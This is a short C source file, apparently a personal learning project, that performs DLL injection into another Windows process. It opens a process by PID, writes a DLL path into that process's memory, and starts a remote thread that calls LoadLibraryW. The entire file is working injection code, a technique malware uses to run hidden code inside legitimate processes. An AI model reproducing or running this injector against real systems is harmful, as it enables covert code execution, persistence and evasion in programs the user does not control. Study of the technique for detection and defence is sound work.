#include <stdio.h>
#include <windows.h>

/*
 * Date: 11/24/2024
 * This file will attempt to perform a DLL injection via LoadLibraryW() from Kernel32. 
 * Approach: 
 * 1. open a handle to a process
 * 2. allocate virtual memeory
 * 3. write the path to the DLL into the virtual memory space 
 * 4. get a handle to the Kernel32 module 
 * 5. get the address of LoadLibraryW() from Kernel32
 * 6. Create the thread
*/

const char* k = "[+]";
const char* i = "[!]";
const char* e = "[X]";

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HMODULE hKernel32 = NULL;
HANDLE hProcess, hThread = NULL;

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\waleed-test\\source\\repos\\dll-injection\\x64\\Debug\\DLL-injection.dll";
size_t dllPathSize = sizeof(dllPath);

int main(int argc, char* argv[]) {

	if (argc < 1) {
		printf("%s Usage: %s PID\n", i, argv[0]);
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);

	printf("%s Trying to get a handle on PID: %ld\n", i, PID);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess) {
		printf("%s Could not get a handle on PID: %ld\n", e, PID);
		return EXIT_FAILURE;
	}
	printf("%s Got a handle on PID: %ld!\n\\-----0x%p\n", k, PID, hProcess);

	rBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	if (!rBuffer) {
		printf("%s Could not allocate virtual memory on process: %ld\n Error: %ld", e, PID, GetLastError());
		return EXIT_FAILURE;
	}
	printf("%s Allocate buffer to process memory with PAGE_READWRITE permissions\n", k);

	WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL);

	// This will return a handle to a specific module, in this case Kernel32.dll
	hKernel32 = GetModuleHandleW(L"Kernel32");
	if (!hKernel32) {
		printf("%s Could not get a handle on Kernel32. Error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	}
	printf("%s Got a handle on Kernel32.\n \\-------0x%p\n", e, hKernel32);

	/*
	* This will go into kernel32, grab the address of the LoadLibraryW function, and return it into our variable LoadLibraryWAddress.
	* This is done to run our custom DLL
	*/
	LPTHREAD_START_ROUTINE LoadLibraryWAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	printf("%s Got the address of LoadLibraryW()\n\\--------0x%p\n", k, LoadLibraryWAddress);
	hThread = CreateRemoteThread(hProcess, NULL, 0, LoadLibraryWAddress, rBuffer, 0, &TID);
	if (!hThread) {
		printf("%s Could not start thread. Error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	}
	printf("%s Started a thread\n\\--------0x%p\n", k, hThread);

	printf("%s Waiting for the thread to finish....", i);
	WaitForSingleObject(hThread, INFINITE);
	printf("%s Thread finished executin, cleaning up....", i);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	printf("%s Finished cleaning up. ", k);
	return EXIT_SUCCESS;
}
